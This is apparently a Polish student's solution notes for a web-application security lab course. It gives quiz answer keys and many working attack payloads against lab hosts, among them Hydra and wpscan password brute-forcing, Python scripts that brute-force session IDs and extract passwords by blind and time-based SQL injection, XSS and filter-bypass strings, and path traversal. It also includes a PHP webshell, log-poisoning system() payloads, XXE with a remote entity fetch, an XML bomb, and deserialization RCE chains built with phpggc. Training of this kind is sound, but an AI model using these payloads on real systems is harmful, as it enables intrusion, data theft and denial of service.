# Wstęp do bezpieczeństwa aplikacji Web
## Zadanie 1 (Podgląd nagłówków odpowiedzi)
[Security of Web applications - preview of response headers - 1.1](https://www.youtube.com/watch?v=-6K7SqADd2s)

```text
Sprawdzenie w konsoli przegladarki
```

## Zadanie 2 (Manipulowanie parametrami HTTP)
[Bezpieczeństwo aplikacji Webowych - manipulowanie parametrami http - 1.2](https://www.youtube.com/watch?v=0VoR903FNqk)

```text
Zmiana id na 6
```

## Zadanie 3 (Uruchomienie i konfiguracja proxy w przeglądarce)
[Web application security - running and configuring the proxy in the browser - 1.3](https://www.youtube.com/watch?v=JapqmeKo-fM)

## Zadanie 4 (Automatyczny skan aplikacji)
[Security of Web applications - automatic application scan - 1.4](https://www.youtube.com/watch?v=R5cjc2nEgU4)

## Zadanie 5 (Modyfikacja żądań HTTP)
[Security of Web applications - modification of http requests - 1.5](https://www.youtube.com/watch?v=0vP1NliWQhE)

## Zadanie 6 (Powtarzanie żądania HTTP)
[Introduction to Web Application Security - HTTP Request Repetition - 1.6](https://www.youtube.com/watch?v=S_gVNlVh1QM)

## Zadanie 7 (Wyszukiwanie właściwej wartości parametru metodą siłową)
[Introduction to Web application security - strength method - 1.7](https://www.youtube.com/watch?v=yW_ZCp0OpIE)

## Zadanie 8 (Test sprawdzający)
1. Oceń prawdziwość zdania. Serwer otrzymując zapytanie HTTP jest w stanie zweryfikować autentyczność zapytania.
	-   Prawda
	-   Fałsz +
2. Oceń prawdziwość zdania. Ruch HTTPS nie może zostać przechwycony za pomocą serwera proxy.
	-   Prawda
	-   Fałsz +
3. Wartości z jakiego zakresu może przyjąć kod statusu zwracany w odpowiedzi zapytania HTTP?
	-   100-599 +
	-   100-500
	-   1-500
	-   1-99
4. Administrator serwera HTTP ukrył pod adresem znanym tylko przez niego plik. Czy zewnętrzni użytkownicy mogą uzyskać dostęp do tego pliku?
	-   Tak +
	-   Nie
5. Jak nazywamy parametry dodawane do adresu URL zaczynające się od znaku "?" oraz rozdzielane znakiem "&"?
	-   ciałem żądania (request body)
	-   względnymi ścieżkami adresu URL (relative link)
	-   bezwględnymi ścieżkami adresu URL (absolute link)
	-   łańuchami zapytania (query string) +
6. Jak nazywamy ataki korzystające z metody siłowej?
	-   Forcemode attack
	-   Dictionary attack
	-   Bruteforce attack +
	-   Enumeration attack
7. Jak nazywamy dane, które przesyłane są zawsze po pierwszej linii zapytania HTTP?
	-   nagłówkami HTTP +
	-   ciałem żądania HTTP
8. Jaki jest domyślny port serwera HTTP?
	-   80 +
	-   800
	-   8080
	-   443
9. Która z poniższych odpowiedzi przedstawia informacje zawarte w pierwszej linii zapytania HTTP?
	-   metoda HTTP, nazwa hosta, wersja HTTP 
	-   metoda HTTP, adres URL, nazwa hosta 
	-   metoda HTTP, nazwa hosta, adres URL 
	-   metoda HTTP, adres URL, wersja HTTP +
10. Która z poniższych odpowiedzi o serwerach proxy jest nieprawdziwa?
	-   Serwer proxy służy jako narzędzie do przechwytywania połączeń pomiędzy dwoma serwerami/klientami. 
	-   Serwer proxy może posłużyć jako firewall, blokujący niechciane połączenia. 
	-   Serwer proxy służy do wykonywania żądań jako klient i przekazuje odpowiedzi od serwera klientowi. 
	-   Serwer proxy wykorzystywany jest do przyspieszenia łącza internetowego. +

# Uwierzytelnienie użytkownika
## Zadanie 1 (Hasło użytkownika o niskiej złożoności)
[Security of Web applications - Hydra - 2.1](https://www.youtube.com/watch?v=kqjclz1qcDs)
```bash
hydra 10.0.58.108 -s 80 -l admin -P 10k-most-common.txt -t 64 -T 64 http-post-form "/:username=^USER^&password=^PASS^&submit=Submit:failed"

hydra {ur ip} -s 80 -l admin -P 10k-most-common.txt -t 64 -T 64 http-post-form "/:user=^USER^&passwd=^PASS^&submit=Submit:bad"
-s 80 (numer portu)
-l admin (login nazwa uz)
-P file
-t (number of querys)
-T (every page)
```
## Zadanie 2 (Identyfikator sesji o niskiej losowości)
[Security of web applications - Cookies - 2.2](https://www.youtube.com/watch?v=A2G-llvBq_c)
```python
import requests
for i in range(100):
	r = requests.get('http://10.0.103.250/', cookies={'CS_SESSION': str(i)})
		if 'Admin Panel' in r.text:
			print (i)
```
## Zadanie 3 (Uwierzytelnianie po stronie klienta)
[Web application security - application side authentication - 2.3](https://www.youtube.com/watch?v=FbzuexT1TU0)
## Zadanie 4 (Nieprawidłowa obsługa przypomnienia hasła)
[Web application security - password reset - 2.4](https://www.youtube.com/watch?v=nNHND_oWbNA))
```python
import requests

for i in range(700):

	r = requests.get('http://10.0.112.229/reset-password?pwd_id=KDdp'+str(i))
	if 'Password reset ID is invalid' not in r.text:
		print (i)
```
## Zadanie 5 (Enumeracja użytkowników na podstawie czasu odpowiedzi)
[Security of web applications - enumeration of users - 2.5](https://www.youtube.com/watch?v=cQ-ZgJ-odQA)
## Zadanie 6 (Test sprawdzający)
1. Oceń prawdziwość zdania. Walidacja użytkownika w serwisach HTTP jest zawsze przeprowadzana po stronie klienta.
	-   Prawda
	-   Fałsz +
2. W jaki sposób serwery przekazują użytkownikowi dowód potwierdzający jego zalogowanie?
	-   Użytkownik otrzymuje stosowny komunikat w odpowiedzi
	-   Użytkownik otrzymuje od serwera ciasteczka z numerem sesji +
	-   Użytkownik otrzymuje klucz publiczny serwera, który wykorzystuje do potwierdzenia swojej tożsamości
	-   Użytkownikowi przekazywany jest klucz prywatny, którym klient powinien wykorzystać do komunikacji z serwerem
3. Czym jest atak typu session fixation?
	-   Atakiem modyfikującym sesję zalogowanego użytkownika 
	-   Atakiem klonowania sesji użytkownika 
	-   Atakiem usuwającym sesję użytkownika
	-   Atakiem przejęcia sesji +
4. W jaki sposób przeglądarka potwierdza autentyczność strony w protokole HTTPS?
	-   Weryfikuje klucz publiczny strony przesyłany podczas nawiązywania połączenia ze stroną
	-   Weryfikuje klucz prywatny strony przesyłany podczas nawiązywania połączenia ze stroną
	-   Weryfikuje nagłówki HTTP wysyłane w odpowiedzi serwera 
	-   Weryfikuje cyfrowy certyfikat przesyłany podczas nawiązywania połączenia ze stroną +
5. Oceń prawdziwość zdania. Protokół HTTP jest protokołem bezstanowym.
	-   Prawda +
	-   Fałsz
6. W jakim celu wykorzystuje się atak na czas odpowiedzi serwera?
	-   Atak służy do zablokowania serwera
	-   Atak służy do opóźnienia czasu odpowiedzi serwera
	-   Atak służy do spowodowania wycieku danych +
	-   Atak służy do otrzymania zdalnej powłoki na serwerze 
7. Oceń prawdziwość zdania. Autoryzacja to proces potwierdzenia tożsamości.
	-   Prawda
	-   Fałsz +
8. Oceń prawdziwość zdania. Identyfikator sesji powinien być generowany tylko raz podczas pierwszego zalogowania użytkownika przy następnych logowaniach użytkownik powinien otrzymać ten sam identyfikator.
	-   Prawda
	-   Fałsz +

# Kontrola dostępu do funkcji i danych
## Zadanie 1 (Dostęp do ukrytych stron)
[Security of Web Applications - Access to hidden pages](https://www.youtube.com/watch?v=3F6lGpju8kQ)
```bash
http://10.0.96.79/robots.txt
- dirb
http://10.0.96.79/admin
- dirbuster
- gobuster
gobuster dir -u http://10.0.96.79/ -w /usr/share/wordlists/dirbuster/directory-list-1-0.txt
```
## Zadanie 2 (Luki w dostępie do API)
[Security of Web applications - Security flaw in access to API](https://www.youtube.com/watch?v=U2N77CR0XmY)
```bash
http://10.0.3.191/api/?controller=user&action=delete&user=Cyberskiller
http://10.0.10.32/api/v2/?controller=user&action=delete&user=CyberSkiller
```
## Zadanie 3 (Manipulowanie parametrami HTTP)
[Security of Web applications - HTTP parameters manipulation](https://www.youtube.com/watch?v=Of5sZks7Uvg)
```bash
price-1=-25&quantity-1=1&price-2=-25&quantity-2=1
```
## Zadanie 4 (Podatność typu Path Traversal)
[Security of Web applications - Path Traversal vulnerability](https://www.youtube.com/watch?v=WOciNA2oGAk)
```bash
http://10.0.101.143/?image=../../../sec/secret.txt
```
## Zadanie 5 (Podatność typu Insecure Direct Object Reference)
[Security of Web applications - Insecure Direct Object Reference vulnerability](https://www.youtube.com/watch?v=6f8Czxd7DAk)
## Zadanie 6 (Test sprawdzający)
1. Oceń prawdziwość zdania. Narzędzie gobuster nie pozwoli na wyszukiwanie zasobów dostępnych po zalogowaniu na serwer HTTP.
	-   Prawda
	-   Fałsz +
2. Na stronie HTTP udostępniony został skrypt umożliwiający pobieranie pliku podanego w parametrze. W jaki sposób możemy zabezpieczyć ten skrypt i stronę przed podatnością Insecure Direct Object Reference?
	-   Należy usunąć parametr wskazujący na plik
	-   Należy zdefiniować folder z którego pobierane są pliki
	-   Należy dodać autoryzację - użytkownik pobierający plik powinien mieć odpowiedni dostęp +
	-   Należy dodać uwierzytelnienie, tylko zalogowani użytkownicy mogą pobierać plik
3. Oceń prawdziwość zdania. Każda próba dostępu do funkcji administracyjnych powinna podlegać autoryzacji.
	-   Prawda +
	-   Fałsz
4. Oceń prawdziwość zdania. Autoryzacja i uwierzytelnienie to synonimy.
	-   Prawda
	-   Fałsz +
5. Serwer HTTP udostępnia możliwość pobierania plików, a nazwę pliku przyjmuje w parametrze. W jaki sposób za pomocą podatności Path Traversal możemy odwołać się do pliku secret.txt w katalogu /root, skoro wiemy, że pliki domyślnie pobierane są z folderu /home/user?
	-   /root/secret.txt
	-   ./root/secret.txt
	-   ../root/secret.txt
	-   ../../root/secret.txt +
6. Która z poniższych odpowiedzi jest fałszywa? Narzędzie gobuster służy do:
	-   Ataku siłowego na katalogi na dysku lub na serwerze HTTP
	-   Ataku siłowego na formularze logowania +
	-   Ataku siłowego na domeny
	-   Ataku siłowego na wirtualne hosty
# SQL Injection
## Zadanie 1 (Klasyczna podatność SQL Injection)
[Security of Web application - Classic SQL Injection vulnerability](https://www.youtube.com/watch?v=3mpgwnGc4Q4)
## Zadanie 2 (Odczyt schematu bazy danych)
[Security of Web Applications - Reading the database schema - 4.2](https://www.youtube.com/watch?v=j3v2oMuK3kc)
```bash
sqlmap -h
http://10.0.1.206/?query=%22%20union%20select%20table_name%20from%20information_schema.tables%20--%20a
http://10.0.17.148/?query=%22%20union%20select%20column_name%20from%20information_schema.columns%20where%20table_name%20=%20%27CS%27%20--%20-
```
## Zadanie 3 (Identyfikacja wersji serwera bazy danych)
[Security of Web Applications - Identification of the database server version](https://www.youtube.com/watch?v=1Ka4-DHyEwI)
```sql
-mysql
http://10.0.43.244/?query= " union select sleep(5) -- - "
-posgradesql
http://10.0.43.244/?query=" union select pg_sleep(5) -- - "
-oraclesql
http://10.0.43.244/?query=" union select reminder(7,5) -- - "
-mssql
http://10.0.43.244/?query=" union select GETUTCDATE() -- - "
```
## Zadanie 4 (Podatność SQL Injection typu Blind)
[Security of Web Applications - Blind SQL Injection vulnerability]https://www.youtube.com/watch?v=6tFDstB0s6w)
```sql
10.0.36.18/?query=" union select username from users where username = 'CyberSkiller' -- -"
XXXXXXX" union select table_name from information_schema.tables where 1=0 -- -"
XXXXXXX" union select username from users where username = 'CyberSkiller' -- -"

http://10.0.36.18/?query=XXXXXXX%22+union+select+username+from+users+where+username+%3D+%27CyberSkiller%27+and+password+like+%270%25%27+--+-
```

```python
import requests
URL = 'http://10.0.36.18/?query=XXXXXXX%22+union+select+username+from+users+where+username+%3D+%27CyberSkiller%27+and+password+like+%27CS{}%25%27--+-'
N = 10
password = ''
for k in range(N):
	for i in range(10):
		r = requests.get(URL.format(password + str(i)))
		if 'This title (or similar) does exist in our database' in r.text:
			password += str(i)
			break
print(password)
```

```python
import requests
URL = 'http://10.0.124.103/?q=XXXXXXX%22+union+select+account_username+from+accounts+where+account_username+%3D+%27CS%27+and+account_password+like+%27CS{}%25%27--+-'
N = 10
password = ''
for k in range(N):
	for i in range(10):
		r = requests.get(URL.format(password + str(i)))
		if 'This title (or similar) does exist in our database' in r.text:
			password += str(i)
			break
print(password)
```

## Zadanie 5 (Podatność SQL Injection typu Time Based)
[Security of Web applications - Time-based SQL Injection vulnerability - 4.5](https://www.youtube.com/watch?v=vDiP4yjhU6M)
```text
" or sleep(5) -- -
http://10.0.125.52/?query=%22+union+select+if+(password+like+%274%25%27%2C+sleep(5)%2C+%22a%22)+from+users+where+username+%3D+%27CyberSkiller%27+--+-
```

```python
import requests
import time
import string

def check_password(password):
	URL = 'http://10.0.125.52/?query="+union+select+if+(password+like+"{}%25"%2C+sleep(1)%2C+"a")+from+users+where+username+%3D+"CyberSkiller"+--+-'
	url_with_password = URL.format(password)
	
	start_time = time.time()
	requests.get(url_with_password)
	end_time = time.time()
	
	return (end_time - start_time) > 1
	
password = ''
while True:
	found = False
	for c in string.ascii_uppercase + string.digits:
		if check_password(password + c):
			password = password + c
			found = True
			break
	if not found:
		break
	print(password)
```
## Zadanie 6 (Test sprawdzający)
1. Oceń prawdziwość zdania. Ataki SQL Injection nie różnią się pomiędzy różnymi systemami zarządzania bazami danych.
	-   Prawda
	-   Fałsz +
1. Na czym polega podatność typu SQL Injection?
	-   Na wstrzykiwaniu kodu SQL do zapytań baz danych +
	-   Na wstrzykiwaniu danych logowania użytkowników do bazy SQL
	-   Na wstrzykiwaniu zaszyfrowanych wartości do zapytań baz danych
	-   Na wstrzykiwaniu tagów HTML do zapytań baz danych
2. Jak nazywamy zbiór informacji o budowie bazy danych?
	-   Zapytaniem bazy danych
	-   Schematem bazy danych +
	-   Zrzutem bazy danych
	-   Dokumentacją bazy danych
3. Który z poniższych ciągów znaków służy do dołączenia komentarza do zapytania SQL?
	-   ''
	-   //
	*   -- +
	-   **
4. Oceń prawdziwość zdania. Podatność SQL Injection pozwala na pobranie danych tylko i wyłącznie z jednej tabeli.
	-   Prawda
	-   Fałsz +
5. Czym charakteryzuje się atak SQL Injection typu blind?
	-   Podczas ataku analizujemy czas odpowiedzi systemu
	-   Atak zwraca pozytywny wynik w przypadku znalezienia pełnej wartości +
	-   Atak wymaga od nas odnalezienia nazw wszystkich tabel w bazie danych, a następnie połączenia ich w zapytaniu SQL
	-   Atak polega na odnalezieniu wersji systemu zarządzania bazą danych
6. Które z poniższych zdań nie opisuje mechanizmu Prepared Statement w bazach SQL?
	-   Mechanizm pozwala na przypisanie parametrów do nazw
	-   Mechanizm jest kompilowany przy każdym użyciu +
	-   Mechanizm pozwala na definiowanie anonimowych parametrów zapytania
	-   Mechanizm pozwala na wielokrotne wykonywanie zapytania z różnymi parametrami
7. Oceń prawdziwość zdania. Mechanizm Preprared Statement jest podatny na wstrzyknięcie kodu ze względu na to, że jest skompilowany przed użyciem.
	-   Prawda
	-   Fałsz +
# Cross Site Scripting (XSS)
## Zadanie 1 (Podatność typu Stored XSS)
[Bezpieczeństwo Web Aplikacji - Podatność typu Stored XSS - 5.1](https://www.youtube.com/watch?v=qjoGjEw-kFw)
```java
<script>alert(1)</script>
```
## Zadanie 2 (Podatność typu Reflected XSS)
[Bezpieczeństwo Web Aplikacji - Podatność typu Reflected XSS - 5.2](https://www.youtube.com/watch?v=Pr9X4eykJUE)
```java
aa<script>alert(1)</script>a
```
## Zadanie 3 (Podatność typu DOM XSS)
[Bezpieczeństwo Web Aplikacji - Podatność typu DOM XSS - 5.3](https://www.youtube.com/watch?v=UDKf08bAe0w)
```shell
http://10.0.13.209/?language=%3Cscript%3Ealert(1)%3C/script%3E
language=<script>alert(1)</script>
```
## Zadanie 4 (Podatność typu XSS (inny wektor))
[Bezpieczeństwo Web Aplikacji - Podatność typu XSS (inny wektor) - 5.4](https://www.youtube.com/watch?v=PkeATGa6690)
```html
"><script>alert(1)</script><img alt ="
```
## Zadanie 5 (Podatność typu XSS (filtrowane tagi))
[Bezpieczeństwo Web Aplikacji - Podatność typu XSS (filtrowane tagi) - 5.5](https://www.youtube.com/watch?v=T4UWfPc21Ts)
```html
AAA<scr<script>ipt>alert(1)</sc<script>ript>BBB
```
## Zadanie 6 (Podatność typu XSS (lepiej filtrowane tagi))
[Bezpieczeństwo Web Aplikacji - Podatność typu XSS (lepiej filtrowane tagi) - 5.6](https://www.youtube.com/watch?v=x7jCmL_FkI8)
```html
AAA<img onerror=alert(1) src=x/>
```
## Zadanie 7 (Podatność typu XSS (walidacja wejścia))
[Bezpieczeństwo Web Aplikacji - Podatność typu XSS (walidacja wejścia) - 5.7](https://www.youtube.com/watch?v=iNEg-G4iX7w)
```html
AAA<svg/onload=alert("SVG XSS")>BBB
```
## Zadanie 8 (Test sprawdzający)
1. Oceń prawdziwość zdania. Złośliwy kod JavaScript może zostać wstrzyknięty tylko i wyłącznie pomiędzy znacznikami <script></script>.
	-   Prawda
	-   Fałsz +
2. Który z poniższych ataków XSS polega na wstrzyknięciu złośliwego kodu, który będzie przechowywany w zewnętrznym źródle?
	-   DOM XSS
	-   Stored XSS +
	-   Reflected XSS
3. Oceń prawdziwość zdania. Ataki Cross Site Scripting polegają tylko i wyłącznie na wstrzyknięciu kodu skryptowego po stronie użytkownika.
	-   Prawda
	-   Fałsz +
1. Oceń prawdziwość zdania. Język HTML jest językiem programowania.
	-   Prawda
	-   Fałsz +
2. Który z poniższych ataków XSS wymaga manipulacji żądania HTTP za każdym razem?
	-   Stored XSS
	-   DOM XSS 
	-   Reflected XSS +
6. Które z poniższych pól pozwala na wykorzystanie podatności DOM XSS?
	-   innerText
	-   innerHTML +
	-   innerDiv
	-   innerElement
7. Który z poniższych ataków XSS nie wymaga aktywności serwera do udanego wstrzyknięcia kodu?
	-   Stored XSS
	-   DOM XSS +
	-   Reflected XSS

# Obsługa danych z niezaufanego źródła
## Zadanie 1 (Odczyt nieoczekiwanego pliku)
[Security of Web Applications - Reading an unexpected file - 6.1](https://www.youtube.com/watch?v=y_43t8ILXzw)
```http
http://10.0.123.86/?page=../secret.txt
http://10.0.20.215/?page=../sec/secret.txt
```
## Zadanie 2 (Odczyt nieoczekiwanego pliku przy użyciu filtrów PHP)
[Security of Web applications - Reading an unexpected file with the use of PHP filters - 6.2](https://www.youtube.com/watch?v=pel0Q457lPM)
```shell
10.0.117.123/?page=php://filter/convert.base64-encode/resource=secret
http://10.0.100.221/?page=php://filter/convert.base64-encode/resource=../sec/secret
base64 -d text.txt  
```
## Zadanie 3 (Uruchomienie złośliwej komendy poprzez wgranie pliku)
[Security of Web applications - Running a malicious command by uploading a file - 6.3](https://www.youtube.com/watch?v=ZGZivqYmVh0)
```shell
http://10.0.25.123/uploads/webshell.php?cmd=ls
http://10.0.25.123/uploads/webshell.php?cmd=cat%20secret.txt
```

```php
<?php system($_GET['cmd']);?>
```
## Zadanie 4 (Zabezpieczone wgrywanie plików)
[Security of Web applications - Secure file upload - 6.4](https://www.youtube.com/watch?v=jCarh6E6MFw)
```shell
text/plain
http://10.0.14.211/uploads/webshell.php
```
## Zadanie 5 (Zdalny odczyt nieoczekiwanego pliku)
[Security of Web applications - Remote reading of an unexpected file - 6.5](https://www.youtube.com/watch?v=zFp8nezFuP0)
```shell
http://10.0.51.208/?page=../../../../../etc/passwd
<?php echo file_get_contents('secret.php'); ?>
<?php echo file_get_contents('../sec/secret.txt'); ?>
```
## Zadanie 6 (Trywialny Web Application Firewall (WAF))
[Security of Web applications - Standard Web Application Firewall (WAF) - 6.6](https://www.youtube.com/watch?v=zLyVCJbTJyw)
```shell
http://10.0.92.53/?page=/var/www/index.php
http://10.0.92.53/?page=/var/www/secret
10.0.92.53/?page=../secret
```
## Zadanie 7 (Walidacja pobieranych dokumentów (WAF))
[Security of Web applications - Protected files download (WAF) - 6.7](https://www.youtube.com/watch?v=6Bw5y4Ifabo)
```shell
Here is your link: http://10.0.68.66?page=302&dst=http://localhost/bb&src=http://localhost:8080/aa

echo urlencode('http://10.0.68.66?page=302&dst=http://localhost/dst&src=http://localhost:8080/aa');

http://10.0.68.66/?page=download&file_url=http%3A%2F%2F10.0.68.66%3Fpage%3D302%26/%3Dhttp%3A%2F%2Flocalhost%2Fdst%26src%3Dhttp%3A%2F%2Flocalhost%3A8080%2Faa.html

http://10.0.68.66?page=302&dst=http://localhost:8080/bb&src=http://localhost:8080/aa
```
## Zadanie 8 (Niebezpieczna przeglądarka logów)
[Security of Web applications - Insecure log browser - 6.7](https://www.youtube.com/watch?v=bl77MrlujI4)
```shell
<?php echo '------' . file_get_contents('./secret.txt') . '------'; ?>\
<?php echo '------' . file_get_contents('/var/www/secret.txt') . '------'; ?>
```
## Zadanie 9 (Zabezpieczona przeglądarka logów)
[Security of Web applications - Secure log browser - 6.9](https://www.youtube.com/watch?v=zeVFV4jiTVY)
```shell
X-Forwarded-For: <?php echo system("ls") ?>
X-Forwarded-For: <?php echo system("cat index.php") ?>
X-Forwarded-For: <?php echo system("ls /var/www") ?>
X-Forwarded-For: <?php echo system("ls /var/www/secret.txt") ?>
X-Forwarded-For: <?php echo system("cat /var/www/secret.txt") ?>
```
## Zadanie 10 (Wysyłanie maili)
[Security of Web applications - Sending e-mails - 6.9](https://www.youtube.com/watch?v=e75dP_kIzXY)
```shell
http://10.0.47.183/?page=/var/mail/www-data
<?php echo system('ls -la /var/www'); ?>
http://10.0.47.183/?page=/var/www/2e789fac-1ff8-440c-9806-4887ac2aca9f.txt
```
## Zadanie 11 (Test sprawdzający)
1. Oceń prawdziwość zdania. Podatność Path Traversal może zostać wykorzystana za pomocą kodowania procentowego.
	-   Prawda +
	-   Fałsz
2. Oceń prawdziwość zdania. Mechanizm sprawdzający poprawność przesyłanego pliku powinien ten plik uruchomić w celu weryfikacji jego działania i wykrycia złośliwej operacji.
	-   Prawda
	-   Fałsz +
3. Które z poniższych zdań nie jest odpowiednim zabezpieczeniem przed atakiem związanym z pobieraniem plików?
	-   Utworzenie osobnego folderu w którym przechowywane będą pliki dostępne do pobrania +
	-   Udostępnienie linków z nazwą pliku wykorzystaną w skrypcie pobierającym 
	-   Wykorzystanie symbolicznych identyfikatorów dla plików zamiast rzeczywistych nazw
	-   Wykorzystanie filtrowania znaków kropki oraz ukośników 
4. Oceń prawdziwość zdania. Nagłówek HTTP User-Agent można uznać jako zaufane źródło informacji podczas jego przetwarzania przez serwer HTTP.
	-   Prawda
	-   Fałsz +
5. Oceń prawdziwość zdania. Wykorzystywanie szablonów do dynamicznego ładowania stron jest wektorem ataku pozwalającym na uruchomienie kodu z zewnętrznego serwera.
	-   Prawda
	-   Fałsz +
6. Jak nazywa się atak, który polega na zablokowaniu dostępu do aplikacji?
	-   Service bomb
	-   Denial of Service +
	-   External Object Execution 
	-   XML External Entity Attack 

# Przetwarzanie złożonych danych
## Zadanie 1 (Niezabezpieczone parsowanie plików XML)
[Security of Web applications - Unprotected parsing of XML files - 7.1](https://www.youtube.com/watch?v=5IgGb8sXn3w)
```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "../secret.txt" >]>
    <data>
        <name>
            <first>&xxe;</first>
            <last>Wick</last>
        </name>
        <name>
            <first>Anna</first>
            <last>Belle</last>
        </name>
    </data>
```
## Zadanie 2 (Atak odmowy usługi za pomocą bomby XML)
[Security of Web applications - Denial of service attack with the use of an XML bomb - 7.2](https://www.youtube.com/watch?v=Xl65CZwEUxQ)
```php
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
    <data>
        <name>
            <first>&lol9;</first>
            <last>Wick</last>
        </name>
        <name>
            <first>Anna</first>
            <last>Belle</last>
        </name>
    </data>
```
## Zadanie 3 (Niezabezpieczone deserializowanie obiektu)
[Security of Web applications - Unprotected object deserialization - 7.3](https://www.youtube.com/watch?v=MBLQd7zHN0I)
```php
O:17:"GreetingGenerator":1:{s:13:"greeting_file";s:13:"../secret.txt";}
```
## Zadanie 4 (Zabezpieczone parsowanie plików XML)
[Security of Web applications - Protected parsing of XML files - 7.4](https://www.youtube.com/watch?v=3FIvqzzgTlk)
```php
<!ENTITY xxe SYSTEM "file:///var/www/secret.txt" >

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY % sp SYSTEM "http://10.0.23.166/raw/ewunovapif">
%sp;
%param1;
]>
    <data>
        <name>
            <first>&xxe;</first>
            <last>Wick</last>
        </name>
        <name>
            <first>Anna</first>
            <last>Belle</last>
        </name>
    </data>
```
## Zadanie 5 (Od deserializacji obiektu do wykonania kodu na serwerze)
[Security of Web Applications - From deserialization of the object to code execution on the server](https://www.youtube.com/watch?v=t7xbkETIVfU)
```php
http://10.0.63.111/sh.php?cmd=ls%20../
http://10.0.63.111/sh.php?cmd=cat%20../secret.txt

<?php
class TextClass{

    function __construct(){
        $file_contents = file_get_contents("file.txt");
        print $file_contents;
    }
}

class HelperClass{

    public $file = "./sh.php";

    function load_data($data){
        file_put_contents($this->file, $data);
    }
}

class MainClass{

    public $obj;
    public $data;

    function __construct($data) {
        $this->data = $data;
    }

    function __wakeup(){
        if(isset($this->obj)){
            $this->obj->load_data($this->data);
        }
    }
}

$o = new MainClass('<?php system($_GET["cmd"]); ?>');
$o->obj = new HelperClass();
echo serialize($o);
?>
```
## Zadanie 6 (Realny atak na framework za pomocą deserializacji obiektów)
[Security of Web Applications - Real attack on the framework using object deserialization - 7.6](https://www.youtube.com/watch?v=atH4HaHtvg4)
```shell
cd phpggc
./phpggc CodeIgniter4/RCE1 system "ls"
./phpggc CodeIgniter4/RCE1 system "ls" -o rce.txt
cat rce.txt
base64 -w 0 rce.txt
./phpggc CodeIgniter4/RCE1 system "cat /var/www/secret.txt" -o rce.txt
base64 -w 0 rce.txt
user_obj=TzozOToiQ29kZUlnbml0ZXJcQ2FjaGVcSGFuZGxlcnNcUmVkaXNIYW5kbGVyIjoxOntzOjg6IgAqAHJlZGlzIjtPOjQ1OiJDb2RlSWduaXRlclxTZXNzaW9uXEhhbmRsZXJzXE1lbWNhY2hlZEhhbmRsZXIiOjI6e3M6MTI6IgAqAG1lbWNhY2hlZCI7TzoxNzoiQ29kZUlnbml0ZXJcTW9kZWwiOjU6e3M6MTA6IgAqAGJ1aWxkZXIiO086MzI6IkNvZGVJZ25pdGVyXERhdGFiYXNlXEJhc2VCdWlsZGVyIjowOnt9czoxMzoiACoAcHJpbWFyeUtleSI7TjtzOjE1OiIAKgBiZWZvcmVEZWxldGUiO2E6MTp7aTowO3M6ODoidmFsaWRhdGUiO31zOjE4OiIAKgB2YWxpZGF0aW9uUnVsZXMiO2E6MTp7czoyOiJpZCI7YToxOntzOjU6InJ1bGVzIjthOjE6e2k6MDtzOjY6InN5c3RlbSI7fX19czoxMzoiACoAdmFsaWRhdGlvbiI7TzozMzoiQ29kZUlnbml0ZXJcVmFsaWRhdGlvblxWYWxpZGF0aW9uIjoxOntzOjE1OiIAKgBydWxlU2V0RmlsZXMiO2E6MTp7aTowO3M6NToiZmluZm8iO319fXM6MTA6IgAqAGxvY2tLZXkiO3M6MjM6ImNhdCAvdmFyL3d3dy9zZWNyZXQudHh0Ijt9fQ==
greetings=++++++++++++++++++++%7B%7D
```
## Zadanie 7 (Test sprawdzający)
1. Oceń prawdziwość zdania. Encja parametryczna w języku XML służy do definiowania zmiennych w deklaracji dokumentu.
	-   Prawda +
	-   Fałsz
2. Jak nazywamy mechanizm służący do zapisania lub odtworzenia stanu obiektu?
	-   Serializacją danych +
	-   Szyfrowaniem danych
	-   Agregacja danych
	-   Kodowaniem danych
3. Który z poniższych formatów nie jest używany do zapisywania danych przechowywanych w pamięci systemu jak np. obiekt klasy?
	-   JSON
	-   YAML
	-   JavaScript +
	-   XML
4. Jak nazywa się nagłówek HTTP informujący klienta o postaci przesyłanych danych?
	-   Data-Type
	-   Data
	-   Content-Type +
	-   Content
5. Na czym polega atak XML External Entity?
	-   Polega na zdefiniowaniu encji odwołujących się do plików serwera, które nie są publicznie dostępne +
	-   Polega na wykorzystaniu encji do wyświetlenia wycinka pamięci procesu
	-   Polega na wyłączeniu instancji serwera poprzez odwołanie się do nie istniejącego zasobu na serwerze
	-   Polega na wykorzystaniu większości zasobów serwera poprzez odwołanie się do nie istniejącego pliku na serwerze
6. Oceń prawdziwość zdania. Wykorzystanie zagnieżdżonych encji może prowadzić do ataku typu Denial of Service.
	-   Prawda +
	-   Fałsz
7. Oceń prawdziwość zdania. Encje w języku XML są definicją zmiennych.
	-   Prawda +
	-   Fałsz
8. Oceń prawdziwość zdania. Wbudowana funkcja serialize w języku PHP serializuje zarówno pola jak i metody klasy.
	-   Prawda
	-   Fałsz +

# Błędy konfiguracji
## Zadanie 1 (Publicznie dostępny panel administracyjny)
[Security of Web Applications - Publicly accessible administration panel - 8.1](https://www.youtube.com/watch?v=ZVOGChbZYP4)
```shell
wpscan --url http://10.0.69.196 -U CyberSkiller -P SecLists/Passwords/Common-Credentials/10k-most-common.txt

